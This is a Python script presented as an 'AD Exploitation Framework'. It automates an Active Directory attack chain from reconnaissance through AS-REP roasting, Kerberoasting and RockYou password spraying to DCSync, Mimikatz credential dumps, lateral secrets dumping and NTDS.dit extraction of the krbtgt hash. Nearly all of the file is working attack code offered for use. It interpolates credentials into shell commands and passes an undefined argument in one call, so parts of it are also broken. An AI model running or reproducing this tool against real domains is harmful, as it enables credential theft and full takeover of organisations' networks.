#!/usr/bin/env python3
"""
AD AutoPwn Professional - Interactive AD Exploitation Framework
"""
import os
import sys
import re
import subprocess
import json
import argparse
import ldap3
import getpass
from datetime import datetime

# ASCII Banner
BANNER = r"""
  ___   _____  _       _      _____       _        _      ____  _             
 / _ \ |  _  || |     | |    |  _  |     | |      | |    |  _ \| |_   _ _ __  
/ /_\ \| | | || |     | |    | | | |_ __ | |_ __ _| |_   | |_) | | | | | '_ \ 
|  _  || | | || |     | |    | | | | '_ \| __/ _` | __|  |  __/| | |_| | |_) |
| | | |\ \_/ /| |____ | |____\ \_/ / | | | || (_| | |_   | |   |_|\__,_| .__/ 
\_| |_/ \___/ \_____/ \_____/ \___/|_| |_|\__\__,_|\__|  |_|           |_|    
"""

class ADAutoPwnPro:
    def __init__(self, domain, username, password, dc_ip, output_dir="ad_pentest_results"):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.output_dir = output_dir
        self.findings = []
        self.credentials = []
        self.compromised_hosts = []
        self.discovered_computers = []
        self.discovered_users = []
        self.current_privileges = "User"
        
        os.makedirs(self.output_dir, exist_ok=True)
        self.add_credential(username, password, "Initial")
    
    def add_credential(self, username, password, source):
        self.credentials.append({
            "username": username,
            "password": password,
            "source": source,
            "timestamp": datetime.now().isoformat()
        })
    
    def execute_command(self, command, description, critical=False):
        """Execute system command and log results"""
        try:
            print(f"[*] Executing: {description}")
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                shell=True
            )
            
            # Save output to file
            cmd_safe = re.sub(r'[^\w]', '_', description)[:50]
            output_path = os.path.join(self.output_dir, f"{cmd_safe}.txt")
            with open(output_path, "w") as f:
                f.write(f"COMMAND: {command}\n\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}")
            
            if result.returncode == 0:
                print(f"[+] Success: {description}")
                if critical:
                    print(f"[!] CRITICAL SUCCESS: {description}")
                return True, result.stdout
            else:
                print(f"[-] Failed: {description} (code {result.returncode})")
                return False, result.stderr
        except Exception as e:
            print(f"[!] Command execution failed: {str(e)}")
            return False, str(e)
    
    def run_ldap_query(self, query, attributes=["*"]):
        """Execute LDAP query against domain controller"""
        base_dn = ",".join(f"dc={part}" for part in self.domain.split("."))
        try:
            server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{self.domain}\\{self.username}",
                password=self.password,
                authentication=ldap3.NTLM,
                auto_bind=True
            )
            conn.search(base_dn, query, attributes=attributes)
            return conn.entries
        except Exception as e:
            print(f"[!] LDAP Error: {str(e)}")
            return []
    
    def enumerate_domain(self):
        """Discover computers and users in the domain"""
        print("[*] Enumerating domain objects...")
        
        # Discover computers
        computers = self.run_ldap_query(
            "(objectClass=computer)",
            ["dNSHostName"]
        )
        self.discovered_computers = [str(c.dNSHostName) for c in computers if hasattr(c, 'dNSHostName')]
        
        # Discover users
        users = self.run_ldap_query(
            "(objectClass=user)",
            ["sAMAccountName"]
        )
        self.discovered_users = [str(u.sAMAccountName) for u in users if hasattr(u, 'sAMAccountName')]
        
        # Save discovered targets
        with open(os.path.join(self.output_dir, "computers.txt"), "w") as f:
            f.write("\n".join(self.discovered_computers))
        
        with open(os.path.join(self.output_dir, "users.txt"), "w") as f:
            f.write("\n".join(self.discovered_users))
        
        print(f"[+] Discovered {len(self.discovered_computers)} computers and {len(self.discovered_users)} users")
    
    # ============== ATTACK PHASES ==============
    def discovery_phase(self):
        """Initial reconnaissance focused on the target DC"""
        print("\n[=== DISCOVERY PHASE ===]")
        self.enumerate_domain()
        self.execute_command(f"nmap -sV -O -T4 {self.dc_ip}", "Nmap scan of Domain Controller")
        self.execute_command(f"enum4linux -a {self.dc_ip}", "enum4linux AD enumeration")
        self.execute_command(f"smbmap -H {self.dc_ip} -u '{self.username}' -p '{self.password}'", "SMB share enumeration")
        self.execute_command(f"bloodhound-python -c All -u '{self.username}' -p '{self.password}' -d {self.domain} -dc {self.dc_ip}", "BloodHound data collection")
    
    def vulnerability_scan_phase(self):
        """Identify potential attack vectors on target DC"""
        print("\n[=== VULNERABILITY SCAN PHASE ===]")
        self.execute_command(f"nmap -p 88,135,139,445,389,636 --script vuln {self.dc_ip}", "Common vulnerability scan")
        self.execute_command(f"zerologon-scan {self.dc_ip}", "ZeroLogon vulnerability check")
        self.execute_command(f"nmap -p 445 --script smb-vuln-printnightmare {self.dc_ip}", "PrintNightmare vulnerability check")
        self.execute_command(f"certipy find -u '{self.username}@{self.domain}' -p '{self.password}' -dc-ip {self.dc_ip}", "ADCS vulnerability check")
    
    def exploitation_phase(self):
        """Exploit identified vulnerabilities"""
        print("\n[=== EXPLOITATION PHASE ===]")
        users_file = os.path.join(self.output_dir, "users.txt")
        self.execute_command(f"GetNPUsers.py -dc-ip {self.dc_ip} {self.domain}/ -usersfile '{users_file}' -format hashcat", "AS-REP Roasting attack")
        self.execute_command(f"GetUserSPNs.py -dc-ip {self.dc_ip} {self.domain}/{self.username}:{self.password} -request", "Kerberoasting attack")
        
        # Password spraying with RockYou
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(rockyou_path):
            self.execute_command(
                f"kerbrute passwordspray -d {self.domain} --dc {self.dc_ip} '{users_file}' --passwords '{rockyou_path}'",
                "Password spraying attack with RockYou"
            )
        else:
            print(f"[-] RockYou not found at {rockyou_path}. Skipping password spray.")
    
    def privilege_escalation_phase(self):
        """Gain higher privileges on the DC"""
        print("\n[=== PRIVILEGE ESCALATION PHASE ===]")
        self.execute_command(f"secretsdump.py {self.domain}/{self.username}:{self.password}@{self.dc_ip}", "DCSync attempt")
        self.execute_command(f"crackmapexec smb {self.dc_ip} -u '{self.username}' -p '{self.password}' --local-auth --lsa", "LSA secrets dump")
        self.execute_command(f"mimikatz 'sekurlsa::logonpasswords' exit", "Mimikatz credential dump", shell_type="pwsh")
    
    def lateral_movement_phase(self):
        """Move to other systems in the network"""
        print("\n[=== LATERAL MOVEMENT PHASE ===]")
        if not self.discovered_computers:
            print("[-] No computers discovered. Skipping lateral movement.")
            return
            
        for computer in self.discovered_computers[:5]:  # Limit to 5 for demo
            if computer == self.dc_ip: continue
                
            # Attempt Mimikatz dump
            self.execute_command(
                f"crackmapexec smb {computer} -u '{self.username}' -p '{self.password}' -M mimikatz",
                f"Mimikatz dump on {computer}"
            )
            
            # Attempt to dump secrets
            self.execute_command(
                f"secretsdump.py '{self.domain}/{self.username}:{self.password}@{computer}'",
                f"Secrets dump on {computer}"
            )
    
    def domain_compromise_phase(self):
        """Achieve full domain control"""
        print("\n[=== DOMAIN COMPROMISE PHASE ===]")
        success, output = self.execute_command(
            f"secretsdump.py -just-dc {self.domain}/{self.username}:{self.password}@{self.dc_ip}",
            "NTDS.dit dump",
            critical=True
        )
        
        if success:
            krbtgt_hash = re.search(r"krbtgt:.*:(.*):", output)
            if krbtgt_hash:
                print(f"[GOLDEN] KRBTGT hash: {krbtgt_hash.group(1)}")
                with open(os.path.join(self.output_dir, "golden_ticket.txt"), "w") as f:
                    f.write(f"KRBTGT Hash: {krbtgt_hash.group(1)}\nDomain: {self.domain}\n")
    
    def full_attack_chain(self):
        """Execute complete attack chain"""
        print(BANNER)
        print(f"[!] Starting full attack against {self.domain} (DC: {self.dc_ip})")
        self.discovery_phase()
        self.vulnerability_scan_phase()
        self.exploitation_phase()
        self.privilege_escalation_phase()
        self.lateral_movement_phase()
        self.domain_compromise_phase()
        print("\n[!] Attack chain completed!")
        print(f"[*] Results saved to: {self.output_dir}")
    
    def interactive_menu(self):
        """Display interactive menu"""
        while True:
            print("\n" + "="*50)
            print("AD AutoPwn Professional - Main Menu")
            print("="*50)
            print(f"Domain: {self.domain}")
            print(f"Username: {self.username}")
            print(f"DC IP: {self.dc_ip}")
            print(f"Output: {self.output_dir}")
            print("="*50)
            print("1. Run Full Attack Chain")
            print("2. Discovery Phase")
            print("3. Vulnerability Scan Phase")
            print("4. Exploitation Phase")
            print("5. Privilege Escalation Phase")
            print("6. Lateral Movement Phase")
            print("7. Domain Compromise Phase")
            print("8. Check Current Privileges")
            print("9. Add New Credentials")
            print("0. Exit")
            print("="*50)
            
            choice = input("Select an option: ").strip()
            
            if choice == "1":
                self.full_attack_chain()
            elif choice == "2":
                self.discovery_phase()
            elif choice == "3":
                self.vulnerability_scan_phase()
            elif choice == "4":
                self.exploitation_phase()
            elif choice == "5":
                self.privilege_escalation_phase()
            elif choice == "6":
                self.lateral_movement_phase()
            elif choice == "7":
                self.domain_compromise_phase()
            elif choice == "8":
                self.check_privileges()
            elif choice == "9":
                self.add_credentials_interactive()
            elif choice == "0":
                print("[+] Exiting AD AutoPwn Professional")
                break
            else:
                print("[-] Invalid option, please try again")
    
    def add_credentials_interactive(self):
        """Add new credentials interactively"""
        print("\n[+] Add New Credentials")
        username = input("Username: ").strip()
        password = getpass.getpass("Password: ").strip()
        source = input("Source (e.g., Password Spray, Dumped Hash): ").strip()
        self.add_credential(username, password, source)
        print(f"[+] Added credentials for {username}")
    
    def check_privileges(self):
        """Check current privileges in the domain"""
        try:
            # Check if we're Domain Admin
            result = subprocess.run(
                f"net group 'Domain Admins' /domain",
                capture_output=True,
                text=True,
                shell=True
            )
            
            if self.username in result.stdout:
                self.current_privileges = "Domain Admin"
                print("[+] You have DOMAIN ADMIN privileges!")
            else:
                # Check for other privileged groups
                privileged_groups = ["Enterprise Admins", "Schema Admins", "Administrators"]
                for group in privileged_groups:
                    result = subprocess.run(
                        f"net group '{group}' /domain",
                        capture_output=True,
                        text=True,
                        shell=True
                    )
                    if self.username in result.stdout:
                        self.current_privileges = group
                        print(f"[+] You are member of {group}")
                        return
                
                self.current_privileges = "Standard User"
                print("[+] You have standard user privileges")
        except Exception as e:
            print(f"[-] Error checking privileges: {str(e)}")

def get_input(prompt, password=False):
    """Get user input with optional password masking"""
    if password:
        return getpass.getpass(prompt)
    return input(prompt).strip()

if __name__ == "__main__":
    # Display banner
    print(BANNER)
    print("AD AutoPwn Professional - Complete AD Exploitation Framework")
    print("="*85)
    print("Performs real-world AD penetration testing from discovery to domain compromise")
    print("="*85 + "\n")
    
    # Get inputs sequentially
    print("[+] Please provide the following information:")
    domain = get_input("> Target domain (e.g., corp.example.com): ")
    username = get_input("> Username: ")
    password = get_input("> Password: ", password=True)
    dc_ip = get_input("> Domain Controller IP: ")
    output_dir = get_input("> Output directory [default: ad_pentest_results]: ") or "ad_pentest_results"
    
    # Initialize tool
    tool = ADAutoPwnPro(domain, username, password, dc_ip, output_dir)
    
    # Test connection
    print("\n[+] Testing connection to Active Directory...")
    success, _ = tool.execute_command(
        f"ldapsearch -x -H ldap://{dc_ip} -b \"\" -s base",
        "LDAP connection test"
    )
    
    if success:
        print("[+] Connection successful!")
        tool.interactive_menu()
    else:
        print("[-] Cannot connect to Active Directory. Check credentials and network connectivity.")
